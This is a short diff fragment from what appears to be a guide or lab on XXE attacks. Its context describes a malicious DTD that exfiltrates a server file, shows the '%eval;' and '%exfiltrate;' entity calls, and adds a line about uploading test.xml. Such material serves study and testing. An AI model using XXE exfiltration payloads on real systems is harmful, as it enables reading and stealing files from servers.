@@ -8,3 +8,5 @@ An example of a malicious DTD to exfiltrate the contents of the /hellothere.txt 
 %eval;
 %exfiltrate;
 ```
+
+Upload file test.xml to see how it goes.
